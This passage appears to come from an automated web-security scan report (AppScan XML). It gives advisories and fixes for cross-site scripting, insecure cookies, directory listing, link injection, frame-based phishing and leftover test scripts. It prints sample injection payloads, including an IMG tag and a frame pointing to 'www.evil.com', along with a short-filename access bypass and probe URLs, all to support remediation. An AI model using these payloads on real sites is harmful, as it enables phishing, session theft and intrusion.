              <text>The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text>
              <br />
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>[8-1] Filter user input</text>
              <br />
              <text>To guard the application against cross-site scripting, the developer should sanitize HTML by converting sensitive characters to their corresponding character entities.  These are the HTML sensitive characters:</text>
              <br />
              <text>&lt; &gt; " ' % ; ) ( &amp; +</text>
              <br />
              <br />
              <text>PHP includes some automatic sanitation utility functions, such as htmlentities():</text>
              <br />
              <br />
              <code>  $input = htmlentities($input, ENT_QUOTES, 'UTF-8');
</code>
              <br />
              <br />
              <text>In addition, in order to avoid UTF-7 variants of Cross-site Scripting, you should explicitly define the Content-Type header of the response, for example:</text>
              <br />
              <br />
              <code>  &lt;?php
  header('Content-Type: text/html; charset=UTF-8');
  ?&gt;
</code>
              <br />
              <br />
              <text>[8-2] Secure the cookie</text>
              <br />
              <br />
              <text>When storing sensitive data in a cookie and transporting it over SSL, make sure that you first set the secure flag of the cookie in the HTTP response. This will instruct the browser to only use that cookie over SSL connections.</text>
              <br />
              <br />
              <text>You can use the following code example, for securing the cookie:</text>
              <br />
              <br />
              <code>  &lt;$php
      $value = "some_value";
      $time = time()+3600;
      $path = "/application/";
      $domain = ".example.com";
      $secure = 1;
      setcookie("CookieName", $value, $time, $path, $domain, $secure, TRUE);
  ?&gt;
</code>
              <br />
              <br />
              <text>In addition, we recommend that you use the HttpOnly flag. When the HttpOnly flag is set to TRUE the cookie will be made accessible only through the HTTP protocol. This means that the cookie won't be accessible by scripting languages, such as JavaScript. This setting can effectly help to reduce identity theft through XSS attacks (although it is not supported by all browsers).</text>
              <br />
              <br />
              <text>The HttpOnly flag was Added in PHP 5.2.0.</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <br />
              <text>[1] Mitigating Cross-site Scripting With HTTP-only Cookies: </text>
              <link target="http://msdn2.microsoft.com/en-us/library/ms533046.aspx">http://msdn2.microsoft.com/en-us/library/ms533046.aspx</link>
              <br />
              <text>[2] PHP Security Consortium: </text>
              <link target="http://phpsec.org/">http://phpsec.org/</link>
              <br />
              <text>[3] PHP &amp; Web Application Security Blog (Chris Shiflett): </text>
              <link target="http://shiflett.org/">http://shiflett.org/</link>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>High</Severity>
        <EntityType>Parameter</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="attDirectoryGuessing" Count="2">
        <RemediationID>fix_50040</RemediationID>
        <advisory>
          <name>Directory Listing</name>
          <testDescription>Infrastructure test</testDescription>
          <threatClassification>
            <name>Information Disclosure: Directory Indexing</name>
            <reference>http://www.webappsec.org/projects/threat/classes/directory_indexing.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>Web servers are usually configured to disallow listings of directories containing scripts and textual contents. However, if the web server was configured improperly, it is possible to retrieve a directory listing by sending a request for a specific directory, rather than for a file. Example request for a directory listing of the directory named "some_dir" :</text>
            <br />
            <text>http://TARGET/some_dir/</text>
            <br />
            <br />
            <text>Another possible way to acquire directory listing is by exploiting specific issues in web servers and web applications, such as URL Trickery attacks, or malformed HTTP requests, which force the web server to return a directory listing. These security breaches should be solved by downloading a patch from your application or server vendor.</text>
            <br />
            <br />
            <text>In some web servers running on Win32 operating systems, the access control may be bypassed by using short filenames (8.3 DOS format).</text>
            <br />
            <text>For example, the directory /longdirname/ is denied browsing by the web-server, but its DOS 8.3 equivalent name /LONGDI~1/ may be open to browsing.</text>
            <br />
            <br />
            <text>Note: The directory listing is used by an attacker to locate files in the web directories that are not normally exposed through links on the web site. Configuration files and other components of web applications that potentially contain sensitive information can be viewed this way.</text>
            <br />
          </testTechnicalDescription>
          <causes>
            <cause>Directory browsing is enabled</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to view and download the contents of certain web application virtual directories, which might contain restricted files</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2001-0729">Apache directory listing (CAN-2001-0729)</link>
            <link target="http://www.securiteam.com/windowsntfocus/6P00R0K06Q.html">Microsoft IIS 5.0+WebDav support - directory listing</link>
            <link target="http://www.securiteam.com/windowsntfocus/5WP0Q2035A.html">Jrun directory listing</link>
            <link target="http://www.cert.org/advisories/CA-98.04.Win32.WebServers.html">CERT Advisory CA-98.04</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>[1] Configure the web server to deny listing of directories.</text>
              <br />
              <text>[2] Download a specific security patch according to the issue existing on your web server or web application. Some of the known directory listing issues are listed in the "References" field of this advisory.</text>
              <br />
              <text>[3] A Workaround from the "CERT" advisory found in the "References" field of this advisory, to fix the short filenames (8.3 DOS format) problem:</text>
              <br />
              <text>a. Use only 8.3-compliant short file names for the files that you want to have protected solely by the web server. On FAT file systems (16-bit) this can be enforced by enabling (setting to 1) the "Win31FileSystem" registry key (registry path: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\FileSystem\).</text>
              <br />
              <text>b. On NTFS (32-bit), you can disable the creation of the 8.3-compliant short file name for files with long file names by enabling (setting to 1) the "NtfsDisable8dot3NameCreation" registry key (registry path: HKEY_LOCAL_MACHINE\System\ CurrentControlSet\Control\FileSystem\). However, this step may cause compatibility problems with 16-bit applications.</text>
              <br />
              <text>c. Use NTFS-based ACLs (directory or file level access control lists) to augment or replace web server-based security.</text>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Medium</Severity>
        <EntityType>Page</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="GD_DirListing" Count="1">
        <RemediationID>fix_50040</RemediationID>
        <advisory>
          <name>Directory Listing Pattern Found</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Information Disclosure: Directory Indexing</name>
            <reference>http://www.webappsec.org/projects/threat/classes/directory_indexing.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>AppScan detected a response containing a directory listing.</text>
            <br />
            <br />
            <text>Web servers are usually configured to disallow listings of directories containing scripts and textual contents. However, if the web server was configured improperly, it is possible to retrieve a directory listing by sending a request for a specific directory, rather than for a file. For example,  a directory listing of the directory named "some_dir" could be retrieved with the following request:</text>
            <br />
            <text>http://TARGET/some_dir/</text>
            <br />
            <br />
            <text>Another possible way to acquire a directory listing is by exploiting specific issues in web servers and web applications, such as URL Trickery attacks, or malformed HTTP requests, which force the web server to return a directory listing. These security holes should be closed by downloading a patch from your application or server vendor.</text>
            <br />
            <indentText> </indentText>
            <text>In some web servers running on Win32 operating systems, the access control may be bypassed by using short filenames (8.3 DOS format).</text>
            <br />
            <text>For example, the directory /longdirname/ is denied browsing by the web-server, but its DOS 8.3 equivalent name /LONGDI~1/ may be open to browsing.</text>
            <br />
            <indentText> </indentText>
            <text>Note: The directory listing is used by an attacker to locate files in the web directories that are not normally exposed through links on the web site. Configuration files and other components of web applications that potentially contain sensitive information can be accessed this way.</text>
          </testTechnicalDescription>
          <causes>
            <cause>Directory browsing is enabled</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to view and download the contents of certain web application virtual directories, which might contain restricted files</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2001-0729">Apache directory listing (CAN-2001-0729)</link>
            <link target="http://www.securiteam.com/windowsntfocus/6P00R0K06Q.html">Microsoft IIS 5.0+WebDav support - directory listing</link>
            <link target="http://www.securiteam.com/windowsntfocus/5WP0Q2035A.html">Jrun directory listing</link>
            <link target="http://www.cert.org/advisories/CA-98.04.Win32.WebServers.html">CERT Advisory CA-98.04</link>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=548">CWE-548: Information Leak Through Directory Listing</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>[1] Configure the web server to deny listing of directories.</text>
              <br />
              <text>[2] Download a specific security patch according to the issue existing on your web server or web application. Some of the known directory listing issues are listed in the "References" field of this advisory.</text>
              <br />
              <text>[3] Use the workaround from the "CERT" advisory, found in the "References" field of this advisory, to fix the short filenames (8.3 DOS format) problem:</text>
              <br />
              <text>a. Use only 8.3-compliant short file names for files you want protected solely by the web server. On FAT file systems (16-bit) this can be enforced by enabling (setting to 1) the "Win31FileSystem" registry key (registry path: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\FileSystem\).</text>
              <br />
              <text>b. On NTFS (32-bit), you can disable the creation of the 8.3-compliant short file name for files with long file names by enabling (setting to 1) the "NtfsDisable8dot3NameCreation" registry key (registry path: HKEY_LOCAL_MACHINE\System\ CurrentControlSet\Control\FileSystem\). However, this step may cause compatibility problems with 16-bit applications.</text>
              <br />
              <text>c. Use NTFS-based ACLs (directory or file level access control lists) to augment or replace web server-based security.</text>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Medium</Severity>
        <EntityType>Page</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="attLinkInjection" Count="3">
        <RemediationID>fix_52000</RemediationID>
        <advisory>
          <name>Link Injection (facilitates Cross-Site Request Forgery)</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Client-side Attacks: Content Spoofing</name>
            <reference>http://www.webappsec.org/projects/threat/classes/content_spoofing.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>Link Injection is the act of modifying the content of a site by embedding in it a URL to an external site, or to a script in the vulnerable site. By embedding a URL in the vulnerable site, an attacker is then able to use it as a platform to launch attacks against other sites, as well as against the vulnerable site itself.</text>
            <br />
            <br />
            <text>Some of these possible attacks require the user to be logged in to the site during the attack. By launching these attacks from the vulnerable site itself the attacker increases the chances of success, because the user is more likely to be logged in.</text>
            <br />
            <br />
            <text>The Link Injection vulnerability is a result of insufficient user input sanitation, which is later returned to the user in the site response. The ability to inject hazardous characters into the response makes it possible for attackers to embed URLs, among other possible content modifications.</text>
            <br />
            <br />
            <text>Below is an example for a Link Injection (We will assume that site "www.vulnerable.com" has a parameter called "name", which is used to greet users).</text>
            <br />
            <br />
            <text>The following request:</text>
            <br />
            <text>HTTP://www.vulnerable.com/greet.asp?name=John Smith</text>
            <br />
            <br />
            <text>Will yield the following response:</text>
            <br />
            <code>  &lt;HTML&gt;
  &lt;BODY&gt;
          Hello, John Smith.
  &lt;/BODY&gt;
  &lt;/HTML&gt;
</code>
            <br />
            <br />
            <text>However, a malicious user may send the following request:</text>
            <br />
            <text>HTTP://www.vulnerable.com/greet.asp?name=&lt;IMG SRC="http://www.ANY-SITE.com/ANY-SCRIPT.asp"&gt;</text>
            <br />
            <br />
            <text>This will return the following response:</text>
            <br />
            <code>  &lt;HTML&gt;
  &lt;BODY&gt;
          Hello, &lt;IMG SRC="http://www.ANY-SITE.com/ANY-SCRIPT.asp"&gt;.
  &lt;/BODY&gt;
  &lt;/HTML&gt;
</code>
            <br />
            <br />
            <text>As this example shows, it is possible to cause a user's browser to issue automatic requests to virtually any site the attacker desires. As a result, he may use this Link Injection vulnerability to launch several types of attack:</text>
            <br />
            <br />
            <text>Cross-Site Request Forgery:</text>
            <br />
            <text>An attacker is able to cause the user's browser to send a request to a site where the user is currently logged in, and perform actions that the user did not intend to do. Such actions may include unregistering from the site, or modifying the user's profile, email address or even password, which could result in a complete account takeover.</text>
            <br />
            <br />
            <text>Cross-Site Scripting:</text>
            <br />
            <text>Any Cross-Site scripting attack begins with the act of luring users into clicking a specially crafted URL that exploits vulnerability in the victim site. This is usually done by sending emails that contain the malicious link, or creating a web site that contains a link to the vulnerable site.</text>
            <br />
            <text>With the Link Injection vulnerability, it is possible to embed a malicious URL in site A, that when clicked will launch a Cross-Site Scripting attack against site B.</text>
            <br />
            <br />
            <text>Phishing:</text>
            <br />
            <text>It is possible for an attacker to inject a link to a malicious site that resembles the attacked site. An incautious user may click it and not realize that he is leaving the original site and surfing to a malicious site. The attacker may then lure the user to login again, thus acquiring his login credentials.</text>
          </testTechnicalDescription>
          <causes>
            <cause>Sanitation of hazardous characters was not performed correctly on user input</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to persuade a naive user to supply sensitive information such as username, password, credit card number, social security number etc.</securityRisk>
            <securityRisk>It is possible to steal or manipulate customer session and cookies, which might be used to impersonate a legitimate user, allowing the hacker to view or alter user records, and to perform transactions as that user</securityRisk>
            <securityRisk>It is possible to upload, modify or delete web pages, scripts and files on the web server</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://www.owasp.org/index.php/Cross-Site_Request_Forgery">OWASP Article</link>
            <link target="http://www.cgisecurity.com/articles/csrf-faq.shtml">The Cross-Site Request Forgery FAQ</link>
            <link target="http://download.boulder.ibm.com/ibmdl/pub/software/dw/richmedia/rational/08/appscan_demos/csrf-cbt/viewer.swf#recorded_advisory">Cross-Site Request Forgery Training Module</link>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=74">CWE-74: Failure to Sanitize Data into a Different Plane ('Injection')</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>There are several issues whose remediation lies in sanitizing user input.</text>
              <br />
              <text>By verifying that user input does not contain hazardous characters, it is possible to prevent malicious users from causing your application to execute unintended operations, such as launch arbitrary SQL queries, embed Javascript code to be executed on the client side, run various operating system commands etc.</text>
              <br />
              <br />
              <text>It is advised to filter out all the following characters:</text>
              <br />
              <indentText>   [1] |  (pipe sign)</indentText>
              <indentText>   [2] &amp;  (ampersand sign)</indentText>
              <indentText>   [3] ;  (semicolon sign)</indentText>
              <indentText>   [4] $  (dollar sign)</indentText>
              <indentText>   [5] %  (percent sign)</indentText>
              <indentText>   [6] @  (at sign)</indentText>
              <indentText>   [7] '  (single apostrophe)</indentText>
              <indentText>   [8] "  (quotation mark)</indentText>
              <indentText>   [9] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [10] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [11] &lt;&gt; (triangular parenthesis)</indentText>
              <indentText>   [12] () (parenthesis)</indentText>
              <indentText>   [13] +  (plus sign)</indentText>
              <indentText>   [14] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [15] LF (Line feed, ASCII 0x0a)</indentText>
              <indentText>   [16] ,  (comma sign)</indentText>
              <indentText>   [17] \  (backslash)</indentText>
              <br />
              <br />
              <text>The following sections describe the various issues, their fix recommendations and the hazardous characters that might trigger these issues:</text>
              <br />
              <br />
              <br />
              <text>SQL injection and blind SQL injection:</text>
              <br />
              <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input is valid and expected by the application.</text>
              <br />
              <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views. When using stored procedures, use the ADO command object to implement them, so that variables are strongly typed.</text>
              <br />
              <text>C. Sanitize input to exclude context-changing symbols such as:</text>
              <br />
              <indentText>   [1] '  (single apostrophe)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   [3] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [4] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [5] )  (closing parenthesis)</indentText>
              <indentText>   [6] ;  (semicolon)</indentText>
              <br />
              <br />
              <text>Cross site scripting:</text>
              <br />
              <text>A. Sanitize user input and filter out JavaScript code. We suggest that you filter the following characters:</text>
              <br />
              <indentText>   [1] &lt;&gt; (triangular parenthesis)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   [3] '  (single apostrophe)</indentText>
              <indentText>   [4] %  (percent sign)</indentText>
              <indentText>   [5] ;  (semicolon)</indentText>
              <indentText>   [6] () (parenthesis)</indentText>
              <indentText>   [7] &amp;  (ampersand sign)</indentText>
              <indentText>   [8] +  (plus sign)</indentText>
              <text>B. To fix the &lt;%00script&gt; variant see MS article 821349</text>
              <br />
              <text>C. For UTF-7 attacks:</text>
              <br />
              <indentText>   [-] When possible, it is recommended to enforce a specific charset encoding (using 'Content-Type' header or &lt;meta&gt; tag).</indentText>
              <br />
              <text>HTTP response splitting:</text>
              <br />
              <text>Sanitize user input (at least, such input that is later embedded in HTTP responses).</text>
              <br />
              <text>Make sure that malicious characters are not part of the input, such as:</text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <br />
              <br />
              <text>Remote command execution:</text>
              <br />
              <text>Sanitize input to exclude symbols that are meaningful to the operating system's command execution, such as:</text>
              <br />
              <indentText>    [1] |  (pipe sign)</indentText>
              <indentText>    [2] &amp;  (ampersand sign)</indentText>
              <indentText>    [3] ;  (semicolon sign)</indentText>
              <indentText>   </indentText>
              <br />
              <text>Shell command execution:</text>
              <br />
              <text>A. Never pass unchecked user-input to Perl commands such as: eval(), open(), sysopen(), system().</text>
              <br />
              <text>B. Make sure malicious characters are not part of the input, such as:</text>
              <br />
              <indentText>    [1] $  (dollar sign)</indentText>
              <indentText>    [2] %  (percent sign)</indentText>
              <indentText>    [3] @  (at sign)</indentText>
              <br />
              <br />
              <text>XPath injection:</text>
              <br />
              <text>Sanitize input to exclude context changing symbols such as:</text>
              <br />
              <indentText>   [1] '  (single apostrophe)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   Etc.</indentText>
              <indentText>   </indentText>
              <br />
              <text>LDAP injection:</text>
              <br />
              <text>A. Use positive validation. Alphanumeric filtering (A..Z,a..z,0..9)  is suitable for most LDAP queries.</text>
              <br />
              <text>B. Special LDAP characters which should be filtered out or escaped:</text>
              <br />
              <indentText>   [1] A space or "#" character at the beginning of the string </indentText>
              <indentText>   [2] A space character at the end of the string </indentText>
              <indentText>   [3] ,   (comma sign)</indentText>
              <indentText>   [4] +   (plus sign)</indentText>
              <indentText>   [5] "   (quotation mark)</indentText>
              <indentText>   [6] \   (backslash)</indentText>
              <indentText>   [7] &lt;&gt;  (triangular parenthesis)</indentText>
              <indentText>   [8] ;   (semicolon sign)</indentText>
              <indentText>   [9] ()  (parenthesis)</indentText>
              <br />
              <br />
              <text>MX Injection: </text>
              <br />
              <text>Special MX characters should be filtered out: </text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <br />
              <text>Log Forging: </text>
              <br />
              <text>Special logging characters should be filtered out: </text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <indentText>   [3] BS (Backspace, ASCII 0x08)</indentText>
              <br />
              <text>ORM Injection: </text>
              <br />
              <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input are valid and expected by the application.</text>
              <br />
              <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views.</text>
              <br />
              <text>C. Use a parameterized queries API</text>
              <br />
              <text>D. Sanitize input to exclude context-changing symbols such as (*):</text>
              <br />
              <indentText>   [1] ' (single apostrophe)</indentText>
              <indentText>   [2] " (quotation mark)</indentText>
              <indentText>   [3] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [4] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [5] ) (closing parenthesis)</indentText>
              <indentText>   [6] ; (semicolon)</indentText>
              <indentText> </indentText>
              <indentText>   (*) This applies to SQL. High level query languages may need a different sanitization mechanism.</indentText>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Medium</Severity>
        <EntityType>Parameter</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="phishingInFrames" Count="3">
        <RemediationID>fix_52000</RemediationID>
        <advisory>
          <name>Phishing Through Frames</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Client-side Attacks: Content Spoofing</name>
            <reference>http://www.webappsec.org/projects/threat/classes/content_spoofing.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>Phishing is a general term for attempts to scam users into surrendering private information that will be used for identity theft.</text>
            <br />
            <br />
            <text>It is possible for an attacker to inject a frame or an iframe tag with malicious content which resembles the attacked site. An incautious user may browse it and not realize that he is leaving the original site and surfing to a malicious site. The attacker may then lure the user to login again, thus acquiring his login credentials.</text>
            <br />
            <text>The fact that the fake site is embedded in the original site helps the attacker by giving his phishing attempts a more reliable appearance.</text>
            <br />
            <br />
            <text>Sample Exploit:</text>
            <br />
            <text>If the parameter value is reflected in the response without proper sanitation, the following request:</text>
            <br />
            <text>http://[SERVER]/script.aspx?parameter=&lt;frame name="evil" src="www.evil.com"&gt;</text>
            <br />
            <br />
            <text>will cause the response to contain a frame to the evil site.</text>
          </testTechnicalDescription>
          <causes>
            <cause>Sanitation of hazardous characters was not performed correctly on user input</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to persuade a naive user to supply sensitive information such as username, password, credit card number, social security number etc.</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://www.ftc.gov/bcp/edu/pubs/consumer/alerts/alt127.shtm">FTC Consumer Alert - "How Not to Get Hooked by a 'Phishing' Scam"</link>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=301">CWE-301: Reflection Attack in an Authentication Protocol</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>There are several issues whose remediation lies in sanitizing user input.</text>
              <br />
              <text>By verifying that user input does not contain hazardous characters, it is possible to prevent malicious users from causing your application to execute unintended operations, such as launch arbitrary SQL queries, embed Javascript code to be executed on the client side, run various operating system commands etc.</text>
              <br />
              <br />
              <text>It is advised to filter out all the following characters:</text>
              <br />
              <indentText>   [1] |  (pipe sign)</indentText>
              <indentText>   [2] &amp;  (ampersand sign)</indentText>
              <indentText>   [3] ;  (semicolon sign)</indentText>
              <indentText>   [4] $  (dollar sign)</indentText>
              <indentText>   [5] %  (percent sign)</indentText>
              <indentText>   [6] @  (at sign)</indentText>
              <indentText>   [7] '  (single apostrophe)</indentText>
              <indentText>   [8] "  (quotation mark)</indentText>
              <indentText>   [9] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [10] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [11] &lt;&gt; (triangular parenthesis)</indentText>
              <indentText>   [12] () (parenthesis)</indentText>
              <indentText>   [13] +  (plus sign)</indentText>
              <indentText>   [14] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [15] LF (Line feed, ASCII 0x0a)</indentText>
              <indentText>   [16] ,  (comma sign)</indentText>
              <indentText>   [17] \  (backslash)</indentText>
              <br />
              <br />
              <text>The following sections describe the various issues, their fix recommendations and the hazardous characters that might trigger these issues:</text>
              <br />
              <br />
              <br />
              <text>SQL injection and blind SQL injection:</text>
              <br />
              <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input is valid and expected by the application.</text>
              <br />
              <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views. When using stored procedures, use the ADO command object to implement them, so that variables are strongly typed.</text>
              <br />
              <text>C. Sanitize input to exclude context-changing symbols such as:</text>
              <br />
              <indentText>   [1] '  (single apostrophe)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   [3] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [4] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [5] )  (closing parenthesis)</indentText>
              <indentText>   [6] ;  (semicolon)</indentText>
              <br />
              <br />
              <text>Cross site scripting:</text>
              <br />
              <text>A. Sanitize user input and filter out JavaScript code. We suggest that you filter the following characters:</text>
              <br />
              <indentText>   [1] &lt;&gt; (triangular parenthesis)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   [3] '  (single apostrophe)</indentText>
              <indentText>   [4] %  (percent sign)</indentText>
              <indentText>   [5] ;  (semicolon)</indentText>
              <indentText>   [6] () (parenthesis)</indentText>
              <indentText>   [7] &amp;  (ampersand sign)</indentText>
              <indentText>   [8] +  (plus sign)</indentText>
              <text>B. To fix the &lt;%00script&gt; variant see MS article 821349</text>
              <br />
              <text>C. For UTF-7 attacks:</text>
              <br />
              <indentText>   [-] When possible, it is recommended to enforce a specific charset encoding (using 'Content-Type' header or &lt;meta&gt; tag).</indentText>
              <br />
              <text>HTTP response splitting:</text>
              <br />
              <text>Sanitize user input (at least, such input that is later embedded in HTTP responses).</text>
              <br />
              <text>Make sure that malicious characters are not part of the input, such as:</text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <br />
              <br />
              <text>Remote command execution:</text>
              <br />
              <text>Sanitize input to exclude symbols that are meaningful to the operating system's command execution, such as:</text>
              <br />
              <indentText>    [1] |  (pipe sign)</indentText>
              <indentText>    [2] &amp;  (ampersand sign)</indentText>
              <indentText>    [3] ;  (semicolon sign)</indentText>
              <indentText>   </indentText>
              <br />
              <text>Shell command execution:</text>
              <br />
              <text>A. Never pass unchecked user-input to Perl commands such as: eval(), open(), sysopen(), system().</text>
              <br />
              <text>B. Make sure malicious characters are not part of the input, such as:</text>
              <br />
              <indentText>    [1] $  (dollar sign)</indentText>
              <indentText>    [2] %  (percent sign)</indentText>
              <indentText>    [3] @  (at sign)</indentText>
              <br />
              <br />
              <text>XPath injection:</text>
              <br />
              <text>Sanitize input to exclude context changing symbols such as:</text>
              <br />
              <indentText>   [1] '  (single apostrophe)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   Etc.</indentText>
              <indentText>   </indentText>
              <br />
              <text>LDAP injection:</text>
              <br />
              <text>A. Use positive validation. Alphanumeric filtering (A..Z,a..z,0..9)  is suitable for most LDAP queries.</text>
              <br />
              <text>B. Special LDAP characters which should be filtered out or escaped:</text>
              <br />
              <indentText>   [1] A space or "#" character at the beginning of the string </indentText>
              <indentText>   [2] A space character at the end of the string </indentText>
              <indentText>   [3] ,   (comma sign)</indentText>
              <indentText>   [4] +   (plus sign)</indentText>
              <indentText>   [5] "   (quotation mark)</indentText>
              <indentText>   [6] \   (backslash)</indentText>
              <indentText>   [7] &lt;&gt;  (triangular parenthesis)</indentText>
              <indentText>   [8] ;   (semicolon sign)</indentText>
              <indentText>   [9] ()  (parenthesis)</indentText>
              <br />
              <br />
              <text>MX Injection: </text>
              <br />
              <text>Special MX characters should be filtered out: </text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <br />
              <text>Log Forging: </text>
              <br />
              <text>Special logging characters should be filtered out: </text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <indentText>   [3] BS (Backspace, ASCII 0x08)</indentText>
              <br />
              <text>ORM Injection: </text>
              <br />
              <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input are valid and expected by the application.</text>
              <br />
              <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views.</text>
              <br />
              <text>C. Use a parameterized queries API</text>
              <br />
              <text>D. Sanitize input to exclude context-changing symbols such as (*):</text>
              <br />
              <indentText>   [1] ' (single apostrophe)</indentText>
              <indentText>   [2] " (quotation mark)</indentText>
              <indentText>   [3] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [4] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [5] ) (closing parenthesis)</indentText>
              <indentText>   [6] ; (semicolon)</indentText>
              <indentText> </indentText>
              <indentText>   (*) This applies to SQL. High level query languages may need a different sanitization mechanism.</indentText>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Medium</Severity>
        <EntityType>Parameter</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="ApplicationTestScriptDetected" Count="1">
        <RemediationID>fix_54850</RemediationID>
        <advisory>
          <name>Application Test Script Detected</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Information Disclosure: Predictable Resource Location</name>
            <reference>http://www.webappsec.org/projects/threat/classes/predictable_resource_location.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>A common user can access certain pages on a site through simple surfing (i.e. following web links). However, there might be pages and scripts that are not accessible through simple surfing, (i.e. pages and scripts that are not linked).</text>
            <br />
            <text>An attacker may be able to access these pages by guessing their name, e.g. test.php, test.asp, test.cgi, test.html, etc.</text>
            <br />
            <br />
            <text>Example request for a script named "test.php": </text>
            <br />
            <text>http://[SERVER]/test.php</text>
            <br />
            <br />
            <text>Sometimes developers forget to remove certain debugging or test pages from production environments. These pages may include sensitive information that should not be accessed by web users. They may also be vulnerable and/or help an attacker gain information about the server that will help leverage an attack.</text>
            <br />
            <br />
            <text>Sample Exploit:</text>
            <br />
            <text>http://[SERVER]/test.php</text>
            <br />
            <text>http://[SERVER]/test.asp</text>
            <br />
            <text>http://[SERVER]/test.aspx</text>
            <br />
            <text>http://[SERVER]/test.html</text>
            <br />
            <text>http://[SERVER]/test.cfm</text>
            <br />
            <text>http://[SERVER]/test.cgi</text>
          </testTechnicalDescription>
          <causes>
            <cause>Temporary files were left in production environment</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to download temporary script files, which can expose the application logic and other sensitive information such as usernames and passwords</securityRisk>
          </securityRisks>
          <affectedProducts />
          <references>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=531">CWE-531: Information Leak Through Test Code</link>
          </references>
          <fixRecommendations>
